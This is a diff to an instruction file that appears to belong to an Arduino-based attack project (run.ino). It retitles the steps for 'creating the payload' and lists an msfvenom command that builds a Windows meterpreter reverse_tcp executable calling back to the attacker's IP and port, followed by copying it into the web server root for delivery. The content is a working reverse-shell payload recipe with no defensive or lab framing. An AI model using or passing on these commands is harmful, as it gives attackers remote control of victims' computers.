@@ -1,4 +1,4 @@
-## Instructions:
+## Instructions To Creating the Payload to be executed by run.ino:
   ### On the host machine (linux): // Note: (change 192.168.0.24 to your ip, and 8080 to the port you desire)
    1.  msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows LHOST=192.168.0.24 LPORT=8080 -f exe > shell.exe   
    2.  cp shell.exe /var/www/html
